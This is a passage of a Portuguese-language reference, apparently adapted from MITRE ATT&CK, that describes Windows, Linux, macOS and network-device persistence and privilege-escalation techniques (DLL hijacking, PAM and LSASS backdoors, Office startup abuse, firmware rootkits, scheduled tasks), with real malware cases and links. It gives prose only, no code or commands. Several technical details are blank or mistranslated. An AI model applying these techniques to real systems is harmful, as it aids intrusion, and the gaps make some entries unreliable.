.008 **Recurso de Acessibilidade:** O Windows contém recursos de acessibilidade que podem ser lançados com uma combinação de teclas antes de um usuário ter logado (ex: quando o usuário estiver na tela de logon do Windows). Um adversário pode modificar a forma como esses programas são lançados para obter um prompt de comando ou backdoor sem fazer login no sistema.

**Exemplo de referência:** Dependendo da versão do Windows, um adversário pode tirar proveito desses recursos de diferentes maneiras. Os métodos comuns usados pelos adversários incluem a substituição de binários de recursos de acessibilidade ou ponteiros/referências a esses binários no Registro. Nas versões mais recentes do Windows, o binário substituído precisa ser assinado digitalmente para sistemas x64, o binário deve residir , e deve ser protegido pelo Windows File ou Resource Protection (WFP/WRP).

**REFERÊNCIA:** https://www.slideshare.net/DennisMaldonado5/sticky-keys-to-the-kingdom

.009 **AppCert DLLs:** As bibliotecas de links dinâmicos (DLLs) especificadas na chave Do Registro estão carregadas em todos os processos que chamam as funções de API (Application programming interface, interface de programação de aplicativos)

**Exemplo de procedimento:** Semelhante à Injeção de Processo, esse valor pode ser abusado para obter privilégios elevados, fazendo com que uma DLL maliciosa seja carregada e executada no contexto de processos separados no computador. DLLs appcert maliciosos também podem fornecer persistência ao serem continuamente acionados pela atividade de API.

**REFERÊNCIA:** https://www.mcafee.com/blogs/other-blogs/mcafee-labs/mcafee-uncovers-operation-honeybee-malicious-document-campaign-targeting-humanitarian-aid-groups/

.010 **AppInit DLLs:** Os adversários podem estabelecer persistência e/ou elevar privilégios executando conteúdo malicioso acionado por DLLs AppInit carregados em processos. Bibliotecas de links dinâmicos (DLLs) especificadas no valor nas teclas De registro ou carregadas pelo usuário32.dll em todos os processos que carregam o usuário32.dll. Na prática, este é quase todo programa, já que o usuário32.dll é uma biblioteca muito comum.

**Exemplo de procedimento:** Semelhante à Injeção de Processo, esses valores podem ser abusados para obter privilégios elevados, fazendo com que uma DLL maliciosa seja carregada e executada no contexto de processos separados no computador

**REFERÊNCIA:** https://docs.microsoft.com/en-US/windows/win32/dlls/secure-boot-and-appinit-dlls

.011 **Shimming de aplicação:** Os adversários podem estabelecer persistência e/ou elevar privilégios executando conteúdo malicioso desencadeado por shims de aplicativos. A Infraestrutura de compatibilidade/estrutura de aplicativos do Microsoft Windows (Application Shim) foi criada para permitir a retrocompatibilidade do software à medida que a base de código do sistema operacional muda ao longo do tempo

**Exemplo de procedimento:** arquivo do banco de dados shim continha shellcode para um carregador de primeiro estágio que obteve uma carga útil de shellcode adicional armazenada em uma chave de registro. O shellcode de segunda etapa lançou o CARBANAK DLL (armazenado em uma chave de registro), que gerou uma instância de Service Host ("svchost.exe") e injetou-se nesse processo. 

**REFERÊNCIA:** https://www.mandiant.com/resources/fin7-shim-databases-persistence

.012 **Injeção de opções de execução de arquivos de imagem:** Os IFEOs permitem que um desenvolvedor conecte um depurador a um aplicativo. Quando um processo é criado, um depurador presente no IFEO de um aplicativo será preparado para o nome do aplicativo, efetivamente lançando o novo processo sob o depurador (por exemplo, )

**Exemplo de procedimento:** O SDBbot tem a capacidade de usar opções de execução de arquivos de imagem para persistência se detectar que está sendo executado com privilégios administrativos em uma versão do Windows mais recente que o Windows 7.

**REFERÊNCIA:** https://www.proofpoint.com/us/threat-insight/post/ta505-distributes-new-sdbbot-remote-access-trojan-get2-downloader

.013 **Perfil do PowerShell:** Um perfil powershell () é um script que é executado quando o PowerShell é iniciado e pode ser usado como um script de logon para personalizar ambientes do usuário. O PowerShell suporta vários perfis, dependendo do programa de usuário ou host. Por exemplo, pode haver diferentes perfis para programas de host do PowerShell, como o console PowerShell, PowerShell ISE ou Visual Studio Code. Um administrador também pode configurar um perfil que se aplica a todos os usuários e programas de host no computador local.

**Exemplo de procedimento:** Um adversário também pode ser capaz de escalar privilégios se um script em um perfil do PowerShell for carregado e executado por uma conta com privilégios maiores, como um administrador de domínio.

**REFERÊNCIA:** https://www.welivesecurity.com/2019/05/29/turla-powershell-usage/

.014 **Emond:** Os adversários podem ganhar persistência e elevar privilégios executando conteúdo malicioso desencadeado pelo Monitor de Eventos Daemon (emond). Emond é um Launch Daemon que aceita eventos de vários serviços, executa-os através de um simples mecanismo de regras e toma medidas.

**Exemplo de procedimento:** Os adversários podem abusar desse serviço escrevendo uma regra para executar comandos quando um evento definido ocorrer, como inicialização do sistema ou autenticação do usuário. Os adversários também podem ser capazes de escalar privilégios de administrador para raiz à medida que o serviço emond é executado com privilégios raiz pelo serviço Launch Daemon.

**REFERÊNCIA:** https://www.xorrior.com/emond-persistence/

.015 **Sequestro do modelo de objeto de componente:** O COM é um sistema dentro do Windows para permitir a interação entre componentes de software através do sistema operacional. As referências a vários objetos COM são armazenadas no Registro.

**Exemplo de procedimento:** Os adversários podem usar o sistema COM para inserir códigos maliciosos que podem ser executados no lugar de software legítimo através do sequestro das referências e relacionamentos com como meio de persistência. Sequestrar um objeto COM requer uma alteração no Registro para substituir uma referência a um componente legítimo do sistema que pode fazer com que esse componente não funcione quando executado. Quando esse componente do sistema for executado através da operação normal do sistema, o código do adversário será executado em vez disso.

**REFERÊNCIA:** https://www.welivesecurity.com/wp-content/uploads/2016/10/eset-sednit-part-2.pdf

T1133 **SERVIÇOS REMOTOS EXTERNOS:** erviços remotos como VPNs, Citrix e outros mecanismos de acesso permitem que os usuários se conectem aos recursos internos da rede corporativa a partir de locais externos. Muitas vezes existem gateways de serviço remoto que gerenciam conexões e autenticação de credenciais para esses serviços. Serviços como Windows Remote Management e VNC também podem ser usados externamente.

**Exemplo de procedimento:** O acesso a Contas Válidas para usar o serviço é muitas vezes um requisito, que poderia ser obtido através de pharming credencial ou obtendo as credenciais dos usuários após comprometer a rede corporativa. O acesso também pode ser obtido através de um serviço exposto que não requer autenticação. Em ambientes contêiner, isso pode incluir uma API Docker exposta, servidor API Kubernetes, kubelet ou aplicativo web, como o painel Kubernetes.

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/20/f/xorddos-kaiji-botnet-malware-variants-target-exposed-docker-servers.html

T1574 **FLUXO DE EXECUÇÃO DE SEQUESTRO:**  O fluxo de execução de sequestros pode ser para fins de persistência, uma vez que esta execução sequestrada pode ocorrer recorrentemente ao longo do tempo. Os adversários também podem usar esses mecanismos para elevar privilégios ou evitar defesas, como controle de aplicativos ou outras restrições à execução.

**Exemplo de procedimento:** Há muitas maneiras de um adversário sequestrar o fluxo de execução, inclusive manipulando como o sistema operacional localiza programas a serem executados. Como o sistema operacional localiza bibliotecas a serem usadas por um programa também pode ser interceptada

.001 **Sequestro de ordem de busca DLL:** Os sistemas Windows usam um método comum para procurar DLLs necessários para carregar em um programa. O sequestro de cargas DLL pode ser com o propósito de estabelecer persistência, bem como elevar privilégios e/ou evitar restrições na execução de arquivos. 

**Exemplo de procedimento:** Há muitas maneiras de um adversário sequestrar cargas DLL. Os adversários podem plantar dLLs (Trojan Dynamic-Link Library Library Files, arquivos de biblioteca dynamic-link) em um diretório que será pesquisado antes da localização de uma biblioteca legítima que será solicitada por um programa, fazendo com que o Windows carregue sua biblioteca maliciosa quando for solicitado pelo programa vítima. 

**REFERÊNCIA:** https://owasp.org/www-community/attacks/Binary_planting

.002 **Carregamento lateral DLL:** Semelhante ao DLL Search Order Hijacking, o carregamento lateral envolve o sequestro que dll um programa carrega. Mas, em vez de apenas plantar o DLL dentro da ordem de busca de um programa e esperar que o aplicativo da vítima seja invocado, os adversários podem carregar diretamente suas cargas de lado, invocando então um aplicativo legítimo que executa sua carga(s).

**Exemplo de procedimento:** Os adversários provavelmente usam o side-loading como um meio de mascarar ações que realizam sob um processo de sistema ou software legítimo, confiável e potencialmente elevado. Executáveis benignos usados para carregar cargas laterais não podem ser sinalizados durante a entrega e/ou execução. As cargas adversárias também podem ser criptografadas/embaladas ou ofuscadas até serem carregadas na memória do processo confiável.

**REFERÊNCIA:** https://www.mandiant.com/resources/dll-side-loading-a-thorn-in-the-side-of-the-anti-virus-industry

.004 **Sequestro de Dylib:** Os adversários podem executar suas próprias cargas colocando uma biblioteca dinâmica maliciosa (dylib) com um nome esperado em um caminho que um aplicativo vítima pesquisa no tempo de execução.O carregador dinâmico tentará encontrar os dylibs com base na ordem sequencial dos caminhos de busca. 

**Exemplo de procedimento:** Os adversários podem ganhar a execução inserindo dislitos maliciosos com o nome do dylib desaparecido no caminho identificado. Os dylibs são carregados no espaço de endereço de um aplicativo, permitindo que o dylib malicioso herde o nível de privilégio e recursos da aplicação.

**REFERÊNCIA:** https://www.blackhat.com/docs/us-15/materials/us-15-Wardle-Writing-Bad-A-Malware-For-OS-X.pdf

.005 **Fraqueza das permissões de arquivo do instalador executável:** Os adversários podem executar suas próprias cargas maliciosas sequestrando os binários usados por um instalador. Esses processos podem executar automaticamente binários específicos como parte de sua funcionalidade ou para executar outras ações.

**Exemplo de procedimento:** Os adversários podem usar essa técnica para substituir binários legítimos por outros maliciosos como um meio de executar código em um nível mais alto de permissões. Alguns instaladores também podem exigir privilégios elevados que resultarão em escalada de privilégios ao executar código controlado por adversários. Esse comportamento está relacionado ao Controle de Contas de Usuário de Bypass. Vários exemplos dessa fraqueza nos instaladores comuns existentes foram relatados aos fornecedores de software.

**REFERÊNCIA:** https://www.mozilla.org/en-US/security/advisories/mfsa2012-98/

.006 **Sequestro dinâmico do Linker:** Os adversários podem executar suas próprias cargas maliciosas sequestrando variáveis de ambiente que o linker dinâmico usa para carregar bibliotecas compartilhadas. Durante a fase de preparação de execução de um programa, o linker dinâmico carrega caminhos absolutos de bibliotecas compartilhadas a partir de variáveis de ambiente e arquivos, como no Linux ou no macOS.

**Exemplo de procedimento:** No Linux, os adversários podem apontar para bibliotecas maliciosas que correspondem ao nome de bibliotecas legítimas que são solicitadas por um programa de vítimas, fazendo com que o sistema operacional carregue o código malicioso do adversário após a execução do programa da vítima. pode ser definido através da variável ambiente ou arquivo.

**REFÊRENCIA:** https://www.man7.org/linux/man-pages/man8/ld.so.8.html

.007 **Interceptação de caminho por variável de ambiente PATH:** Os adversários podem colocar um programa em uma entrada anterior na lista de diretórios armazenados na variável ambiente PATH, que o Windows executará quando ele pesquisa sequencialmente através dessa listagem PATH em busca do binário que foi chamado de um script ou da linha de comando.

**Exemplo de procedimento:** 	O PowerSploit  contém uma coleção de módulos Privesc-PowerUp que podem descobrir e explorar oportunidades de interceptação de caminhos na variável ambiente PATH.

**REFERÊNCIA:** https://powersploit.readthedocs.io/en/latest/

.008 **Interceptação de caminho por sequestro de pedidos de busca:** O sequestro de pedidos de pesquisa ocorre quando um adversário abusa da ordem em que o Windows procura programas que não são dados a um caminho. Ao contrário do DLL Search Order Hijacking, o pedido de pesquisa difere dependendo do método usado para executar o programa. 

**Exemplo de procedimento:** Um adversário que encontra um programa vulnerável ao sequestro de pedidos de pesquisa (ou seja, um programa que não especifica o caminho para um executável) pode aproveitar essa vulnerabilidade criando um programa com o nome do programa indevidamente especificado e colocando-o dentro do diretório do programa inicial.

Por exemplo, "exemplo.exe" executa "cmd.exe" com o argumento de linha de comando . Um adversário pode colocar um programa chamado "net.exe" dentro do mesmo diretório, como exemplo.exe, "net.exe" será executado em vez da rede de utilitários do sistema Windows.

**REFERÊNCIA:** https://powersploit.readthedocs.io/en/latest/

.009 **Interceptação de caminho por caminho não citado:** Os adversários podem aproveitar caminhos que não possuem cotações circundantes colocando um executável em um diretório de nível mais alto dentro do caminho, de modo que o Windows escolherá o executável do adversário para lançar. Caminhos de serviço  e caminhos de atalho também podem ser vulneráveis à interceptação de caminhos se o caminho tiver um ou mais espaços e não estiver cercado por aspas (por exemplo, vs. )

**Exemplo de procedimento:** Um adversário pode colocar um executável em um diretório de nível mais alto do caminho, e o Windows resolverá esse executável em vez do executável pretendido. Por exemplo, se o caminho em um atalho for , um adversário pode criar um programa em que será executado em vez do programa pretendido.

**REFERÊNCIA:** https://github.com/EmpireProject/Empire

.010 **Fraqueza de permissões de arquivos de serviços:** Os adversários podem usar falhas nas permissões dos serviços do Windows para substituir o binário que é executado no início do serviço. Esses processos de serviço podem executar automaticamente binários específicos como parte de sua funcionalidade ou para executar outras ações. 

**Exemplo de procedimento:** Os adversários podem usar essa técnica para substituir binários legítimos por outros maliciosos como um meio de executar código em um nível mais alto de permissões. Se o processo de execução for definido para ser executado em um momento específico ou durante um determinado evento (por exemplo, bootup do sistema) então essa técnica também pode ser usada para persistência.

**REFERÊNCIA:** https://blog-assets.f-secure.com/wp-content/uploads/2019/10/15163408/BlackEnergy_Quedagh.pdf

.011 **Fraqueza das permissões de registro de serviços:**  Os adversários podem usar falhas nas permissões de chaves de Registro relacionadas a serviços para redirecionar do executável originalmente especificado para aquele que eles controlam, a fim de iniciar seu próprio código quando um serviço é iniciado. O Windows armazena informações locais de configuração de serviço no Registro em . As informações armazenadas sob as chaves de registro de um serviço podem ser manipuladas para modificar os parâmetros de execução de um serviço através de ferramentas como o controlador de serviço, sc.exe, PowerShell ou Reg.

**Exemplo de procedimento:** Os adversários também podem alterar outras chaves de registro na árvore de Registro do serviço. Por exemplo, a chave pode ser alterada para que o serviço seja executado em um contexto elevado sempre que o serviço falhar ou ser intencionalmente corrompido. A chave contém o nome do DLL de desempenho de um serviço de driver e os nomes de várias funções exportadas no DLL. Se a chave ainda não estiver presente e se um usuário controlado por adversário tiver a permissão, os adversários poderão criar a chave na árvore de Registro do serviço para apontar para uma DLL maliciosa

**REFERÊNCIA:** https://itm4n.github.io/windows-registry-rpceptmapper-eop/

.012 **COR_PROFILER:** Os adversários podem aproveitar a variável ambiente COR_PROFILER para sequestrar o fluxo de execução de programas que carregam o CLR .NET. O COR_PROFILER é um recurso. A variável COR_PROFILER ambiente pode ser definida em vários escopos (sistema, usuário ou processo) resultando em diferentes níveis de influência.

**Exemplo de procedimento:** Os adversários podem abusar COR_PROFILER para estabelecer persistência que execute uma DLL maliciosa no contexto de todos os processos .NET toda vez que o CLR é invocado. O COR_PROFILER também pode ser usado para elevar privilégios (ex: Bypass User Account Control) se o processo da vítima .NET for executado em um nível mais alto de permissão, bem como para gancho e Defesas de Prejuízo fornecidas pelos processos .NET.

T1525 **IMAGEM INTERNA DO IMPLANTE:** Os adversários podem implantar imagens de nuvem ou contêiner com código malicioso para estabelecer persistência após obter acesso a um ambiente. Amazon Web Services (AWS) Amazon Machine Images (AMIs), Google Cloud Platform (GCP) Images e Azure Images, bem como tempos populares de execução de contêineres, como o Docker, podem ser implantados ou backdoored. Uma ferramenta foi desenvolvida para facilitar o plantio de backdoors em imagens de contêineres em nuvem. Se um invasor tiver acesso a uma instância AWS comprometida e permissões para listar as imagens disponíveis do contêiner, ele poderá implantar um backdoor, como um Web Shell

T1556 **MODIFICAR PROCESSO DE AUTENTICAÇÃO:** O processo de autenticação é tratado por mecanismos, como o processo LSASS (Local Security Authentication Server, servidor de autenticação de segurança) e o Gerenciador de Contas de Segurança (SAM) no Windows, módulos de autenticação plugáveis (PAM) em sistemas baseados no Unix e plugins de autorização em sistemas MacOS, responsáveis por coletar, armazenar e validar credenciais.

**Exemplo de procedimentos:** Os adversários podem modificar maliciosamente uma parte desse processo para revelar credenciais ou ignorar mecanismos de autenticação. Credenciais ou acesso comprometidos podem ser usados para contornar controles de acesso colocados em vários recursos em sistemas dentro da rede e podem até ser usados para acesso persistente a sistemas remotos e serviços disponíveis externamente, como VPNs, Outlook Web Access e desktop remoto.

**REFERÊNCIA:** https://www.welivesecurity.com/2014/02/21/an-in-depth-analysis-of-linuxebury/

.001 **Autenticação do controlador de domínio:** Os atacantes podem corrigir o processo de autenticação de um controlador de domínio para contornar os mecanismos de autenticação e permitir acesso às contas. O malware pode ser usado para injetar credenciais falsas no processo de autenticação em um controlador de domínio com a intenção de criar um backdoor usado para acessar a conta e/ou credenciais de qualquer usuário

**Exemplo de procedimento:** A chave skeleton funciona através de um patch em um processo de autenticação do controlador de domínio corporativo (LSASS) com credenciais que os adversários podem usar para contornar o sistema de autenticação padrão. Uma vez corrigido, um adversário pode usar a senha injetada para autenticar com sucesso como qualquer conta de usuário de domínio (até que a chave do esqueleto seja apagada da memória por uma reinicialização do controlador de domínio).

**REFERÊNCIA:** https://www.secureworks.com/research/skeleton-key-malware-analysis

.002 **DLL do filtro de senha:** Os filtros de senha do Windows são mecanismos de aplicação de políticas de senha para contas de domínio e locais. Os filtros são implementados como DLLs contendo um método para validar senhas potenciais contra políticas de senha. Os DLLs do filtro podem ser posicionados em computadores locais para contas locais e/ou controladores de domínio para contas de domínio.

**Exemplo de procedimento:** Os adversários podem registrar filtros de senha maliciosos para coletar credenciais de computadores locais e/ou domínios inteiros. Para realizar a validação adequada, os filtros devem receber credenciais de texto simples do LSA. Um filtro de senha malicioso receberia essas credenciais de texto simples toda vez que uma solicitação de senha fosse feita

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07190154/The-ProjectSauron-APT_research_KL.pdf

.003 **Módulos de autenticação plugáveis:** Os adversários podem modificar módulos de autenticação plugáveis (PAM) para acessar credenciais de usuário ou permitir acesso injustificado às contas.PAM é um sistema modular de arquivos de configuração, bibliotecas e arquivos executáveis que orientam a autenticação para muitos serviços.

**Exemplo de procedimento:** Os adversários podem modificar componentes do sistema PAM para criar backdoors. Os componentes PAM, tais como, podem ser corrigidos para aceitar valores fornecidos por adversários arbitrários como credenciais legítimas. Modificações maliciosas no sistema PAM também podem ser abusadas para roubar credenciais. Os adversários podem infectar os recursos do PAM com código para coletar credenciais do usuário, uma vez que os valores trocados com componentes PAM podem ser de texto simples, uma vez que o PAM não armazena senhas

**REFERÊNCIA:** https://x-c3ll.github.io/posts/PAM-backdoor-DNS/

.004 **Autenticação do dispositivo de rede:** Os adversários podem usar a Patch System Image para codificar duramente uma senha no sistema operacional, ignorando assim os mecanismos de autenticação nativo para contas locais em dispositivos de rede. Modificar a imagem do sistema pode incluir código implantado no sistema operacional para dispositivos de rede fornecer acesso aos adversários usando uma senha específica.

**Exemplo de procedimento: Implante de roteador Cisco: O implante consiste em uma imagem cisco IOS modificada que permite ao invasor carregar diferentes módulos funcionais a partir do anonimato da internet. O implante também fornece acesso irrestrito usando uma senha secreta do backdoor. Cada um dos módulos é habilitado através do protocolo HTTP (não HTTPS), usando um pacote TCP especificamente elaborado enviado para a interface dos roteadores. Os pacotes têm uma sequência não padronizada e números de reconhecimento correspondentes

**REFERÊNCIA: https://www.mandiant.com/resources/synful-knock-acis

T1137 **Startup de aplicativos de escritório:**  O Microsoft Office é um pacote de aplicativos bastante comum em sistemas operacionais baseados no Windows dentro de uma rede corporativa. Existem vários mecanismos que podem ser usados com o Office para persistência quando um aplicativo baseado no Office é iniciado; isso pode incluir o uso de Macros de modelo de escritório e complementos.

.001 **Macros de modelo de escritório:** O Microsoft Office contém modelos que fazem parte de aplicativos comuns do Office e são usados para personalizar estilos. Os modelos base dentro do aplicativo são usados cada vez que um aplicativo é iniciado. Macros de Base Visual para Aplicações (VBA) [2] pode ser inserido no modelo base e usado para executar código quando o respectivo aplicativo Office é iniciado para obter persistência. Exemplos para Word e Excel foram descobertos e publicados. Por padrão, o Word tem um modelo Normal.

**Exemplo de procedimento:** Os adversários também podem alterar a localização do modelo base para apontar para o seu próprio, sequestrando a ordem de pesquisa do aplicativo, por exemplo, o Word 2016 procurará primeiro o Normal.dotm abaixo ou modificando a chave de registro GlobalDotName. Ao modificar a chave de registro GlobalDotName, um adversário pode especificar um local arbitrário, nome do arquivo e extensão de arquivo para usar para o modelo que será carregado na inicialização do aplicativo. 

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/updated-backconfig-malware-targeting-government-and-military-organizations/

.002 **Teste de escritório:** Os atacantes podem abusar da chave do Registro de Office Teste do Microsoft Office para obter persistência em um sistema. Existe um local registro de teste de escritório que permite que um usuário especifique uma DLL arbitrária que será executada toda vez que um aplicativo Office for iniciado.

**Exemplo de procedimento:** Os adversários podem adicionar esta chave De registro e especificar uma DLL maliciosa que será executada sempre que um aplicativo do Office, como Word ou Excel, for iniciado.

**REFERÊNCIA:** https://unit42.paloaltonetworks.com/unit42-technical-walkthrough-office-test-persistence-method-used-in-recent-sofacy-attacks/

.003 **Formulários de perspectiva:** Os formulários do Outlook são usados como modelos para apresentação e funcionalidade em mensagens do Outlook. Formulários personalizados do Outlook podem ser criados que executarão código quando um e-mail especificamente criado for enviado por um adversário utilizando o mesmo formulário personalizado do Outlook.

**Exemplo de procedimento:** Uma vez que formulários maliciosos tenham sido adicionados à caixa de correio do usuário, eles serão carregados quando o Outlook for iniciado. Formulários maliciosos serão executados quando um adversário enviar um e-mail especificamente elaborado para o usuário.

**REFERÊNCIA:** https://sensepost.com/blog/2017/outlook-forms-and-shells/

.004 **Página Inicial do Outlook:** O Outlook Home Page é um recurso legado usado para personalizar a apresentação de pastas do Outlook. Esse recurso permite que uma URL interna ou externa seja carregada e apresentada sempre que uma pasta for aberta. Uma página HTML maliciosa pode ser criada que executará o código quando carregada pelo Outlook Home Page. 

**Exemplo de procedimento:** Uma vez que páginas domésticas maliciosas sejam adicionadas à caixa de correio do usuário, elas serão carregadas quando o Outlook for iniciado. As páginas internas maliciosas serão executadas quando a pasta do Outlook direito estiver carregada/recarregada. 

**REFERÊNCIA:** https://sensepost.com/blog/2017/outlook-home-page-another-ruler-vector/

.005 ** Regras do Outlook:** As regras do Outlook permitem que um usuário defina comportamento automatizado para gerenciar mensagens de e-mail. Uma regra benigna pode, por exemplo, mover automaticamente um e-mail para uma pasta específica no Outlook se contiver palavras específicas de um remetente específico. Podem ser criadas regras do Perspectiva Maliciosa que podem desencadear a execução de código quando um adversário envia um e-mail especificamente criado para esse usuário.

**Exemplo de procedimento:** Uma vez que as regras maliciosas tenham sido adicionadas à caixa de correio do usuário, elas serão carregadas quando o Outlook for iniciado. Regras maliciosas serão executadas quando um adversário enviar um e-mail especificamente elaborado para o usuário

**REFERÊNCIA:** https://github.com/sensepost/ruler

.006 **Complementos:** Os complementos do escritório podem ser usados para adicionar funcionalidade aos programas do Office. Existem diferentes tipos de complementos que podem ser usados pelos vários produtos do Office; incluindo bibliotecas adicionais do Word/Excel (WLL/XLL), complementos VBA, complementos com (Office Component Object Model, modelo de objeto de componentes do escritório), complementos de automação, VBA Editor (VBE), ferramentas de estúdio visual para complementos do Escritório (VSTO) e complementos do Outlook.

T1542 **Inicialização pré-OS:**  Durante o processo de inicialização de um computador, o firmware e vários serviços de inicialização são carregados antes do sistema operacional. Esses programas controlam o fluxo de execução antes que o sistema operacional assuma o controle

**Exemplo de procedimento:** Os adversários podem sobregravar dados em drivers de inicialização ou firmware, como o BIOS (Basic Input/Output System) e o Unified Extensible Firmware Interface (UEFI) para persistir em sistemas em uma camada abaixo do sistema operacional. Isso pode ser particularmente difícil de detectar, pois o malware neste nível não será detectado por defesas baseadas em software do host.

**REFERÊNCIA:** https://en.wikipedia.org/wiki/Booting

.001 **Firmware do sistema:** Os adversários podem modificar o firmware do sistema para persistir nos sistemas.O BIOS (Basic Input/Output System) e o Unified Extensible Firmware Interface (UEFI) são exemplos de firmware do sistema que operam como a interface de software entre o sistema operacional e o hardware de um computador.

**Exemplo de procedimento:** Um grupo hacker usuou um rootkit para manter no sistema de controle remoto, intalando em seus alvos. Mesmo que o usuário formatasse o disco rígido os agentes eram implantados após o Microsoft Windows  estar funcionando. O intruso acessa o pc alvo reinicia no shell e despeja o BIOS e após instala o rootkit e após reinicia o sistema.

**REFERÊNCIA:** https://www.trendmicro.com/en_us/research/15/g/hacking-team-uses-uefi-bios-rootkit-to-keep-rcs-9-agent-in-target-systems.html

.002 **Firmware de componentes:** Alguns adversários podem empregar meios sofisticados para comprometer componentes de computador e instalar firmware malicioso que executará código adversário fora do sistema operacional e do sistema principal de firmware ou BIOS.

**Exemplo de procedimento:** O firmware de componentes maliciosos poderia fornecer tanto um nível persistente de acesso a sistemas, apesar de potenciais falhas típicas para manter o acesso e as re-imagens em disco rígido, bem como uma maneira de escapar das defesas baseadas em software do host e verificações de integridade. A equação é conhecida por ter a capacidade de substituir o firmware em discos rígidos de alguns fabricante: Os ataques que utilizam mídia física (CD-ROMs) são particularmente interessantes porque indicam o uso de uma técnica conhecida como “interdição”, onde os invasores 
interceptam mercadorias embarcadas e as substituem por versões trojanizadas Um desses incidentes envolveu participantes de uma conferência científica em Houston. Ao voltar para casa, alguns dos participantes receberam pelo correio uma cópia dos anais da conferência, juntamente com uma apresentação de slides com vários materiais da conferência. O CD-ROM comprometido usou “autorun.inf” para executar um instalador que começou tentando escalar privilégios usando duas explorações conhecidas do grupo 
EQUATION. Em seguida, tentou executar o implante DOUBLEFANTASY do grupo e instalá-lo na máquina da vítima.

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/08064459/Equation_group_questions_and_answers.pdf

.003 **BotKit:** Um bootkit é uma variante de malware que modifica os setores de inicialização de um disco rígido, incluindo o Master Boot Record (MBR) e o Volume Boot Record (VBR). 

**Exemplo de procedimento:** Um adversário que tenha acesso bruto ao drive de inicialização pode substituir essa área, desviando a execução durante a inicialização do carregador de inicialização normal para o código adversário.

.004 **ROMMONkit:** ROMMON é um firmware de dispositivo de rede Cisco que funciona como um carregador de inicialização, imagem de inicialização ou ajudante de inicialização para inicializar hardware e software quando a plataforma é ligado ou reiniciado.

**Exemplo de procedimento:** Um adversário pode atualizar a imagem ROMMON local ou remotamente (por exemplo, através do TFTP) com código adversário e reiniciar o dispositivo a fim de substituir a imagem ROMMON existente. Isso fornece aos adversários os meios para atualizar o ROMMON para obter persistência em um sistema de uma maneira que pode ser difícil de detectar.

.005 **Boot TFTP:** Os adversários podem abusar do netbooting para carregar um sistema operacional de dispositivo de rede não autorizado a partir de um servidor TFTP

**Exemplo de procedimento:** Os adversários podem manipular a configuração no dispositivo de rede especificando o uso de um servidor TFTP malicioso, que pode ser usado em conjunto com a Imagem do Sistema Modificado para carregar uma imagem modificada na inicialização ou redefinição do dispositivo. A imagem não autorizada permite que os adversários modifiquem a configuração do dispositivo, adicionem recursos maliciosos ao dispositivo e introduzam backdoors para manter o controle do dispositivo de rede, minimizando a detecção através do uso de uma funcionalidade padrão. 

**REFERÊNCIA:** https://community.cisco.com/t5/security-blogs/attackers-continue-to-target-legacy-devices/ba-p/4169954

T1053 **Tarefa/trabalho agendado:** Os adversários podem abusar da funcionalidade de agendamento de tarefas para facilitar a execução inicial ou recorrente de código malicioso. Existem utilitários dentro de todos os principais sistemas operacionais para agendar programas ou scripts a serem executados em uma data e hora especificadas. 

**Exemplo de procedimento:** Os adversários podem usar o agendamento de tarefas para executar programas na inicialização do sistema ou em uma base programada para persistência. Esses mecanismos também podem ser abusados para executar um processo no contexto de uma conta especificada (como uma com permissões/privilégios elevados).

**REFERÊNCIA:** https://media.kasperskycontenthub.com/wp-content/uploads/sites/43/2018/03/07190156/The-ProjectSauron-APT_Technical_Analysis_KL.pdf

.001 **Em Linux:** O comando em sistemas operacionais Linux permite que os administradores agendem tarefas. Um adversário pode usar em ambientes Linux para executar programas na inicialização do sistema ou em uma base programada para persistência. também pode ser abusado para realizar execução remota como parte do Movimento Lateral e ou para executar um processo no contexto de uma conta especificada.

**Exemplo de procedimento:** Os adversários também podem abusar para sair de ambientes restritos usando uma tarefa para gerar um shell de sistema interativo ou para executar comandos do sistema. Da mesma forma, também pode ser usado para o Privilege Escalation se o binário for autorizado a funcionar como superusuário via .sudo

**REFERÊNCIA:** https://gtfobins.github.io/gtfobins/at/

.002 **Em (Windows):** Os adversários podem abusar da utilidade para realizar agendamento de tarefas para execução inicial ou recorrente de código malicioso. O utilitário at existe como um executável dentro do Windows para agendar tarefas em uma hora e data especificadas. O uso de requer que o serviço Task Scheduler esteja sendo executado e que o usuário esteja logado como membro do grupo de administradores locais. 

**Exemplo de procedimento:** Um adversário pode usar em ambientes Windows para executar programas na inicialização do sistema ou em uma base programada para persistência. também pode ser abusado para realizar execução remota como parte do Movimento Lateral e ou para executar um processo no contexto de uma conta especificada (como SYSTEM)

**REFERÊNCIA:** https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-xp/bb490866(v=technet.10)?redirectedfrom=MSDN

.003 **Comparsa:** O utilitário é um programador de trabalho baseado no tempo para sistemas operacionais semelhantes ao Unix. O arquivo contém o cronograma de entradas de cron a serem executadas e os horários especificados para execução. Todos os arquivos são armazenados em caminhos de arquivo específicos do sistema operacional.cron crontab crontab

**Exemplo de procedimento:** Um adversário pode usar em ambientes Linux ou Unix para executar programas na inicialização do sistema ou em uma base programada para persistência. cron | Uma ferramenta de comando e controle DNS conhecida como Anchor_DNS.
Muitas vezes entregue como parte de um zip, este malware é um backdoor Linux leve. Após a execução, ele se instala como um trabalho de cron, determina o ip público para o host e, em seguida, começa a farol via consultas DNS para o seu servidor C2.

**REFERÊNCIA:** https://medium.com/stage-2-security/anchor-dns-malware-family-goes-cross-platform-d807ba13ca30

.005 **Tarefa agendada:** Os adversários podem abusar do Agendador de Tarefas do Windows para executar o agendamento de tarefas para execução inicial ou recorrente de código malicioso. Existem várias maneiras de acessar o Agendador de Tarefas no Windows. O pode ser executado diretamente na linha de comando, ou o Agendador de Tarefas pode ser aberto através da GUI na seção Ferramentas de Administrador do Painel de Controle. 

**Exemplo de procedimento:**  Em alguns casos, os adversários usaram um invólucro .NET para o Windows Task Scheduler e, alternativamente, os adversários usaram a biblioteca do Windows netapi32 para criar uma tarefa agendada.schtasks
Um adversário pode usar o Windows Task Scheduler para executar programas na inicialização do sistema ou em uma base programada para persistência. O Agendador de Tarefas do Windows também pode ser abusado para realizar execução remota como parte do Movimento Lateral e ou para executar um processo no contexto de uma conta especificada (como o SYSTEM).

**REFERÊNCIA:** https://www.sentinelone.com/labs/agent-tesla-old-rat-uses-new-tricks-to-stay-on-top/

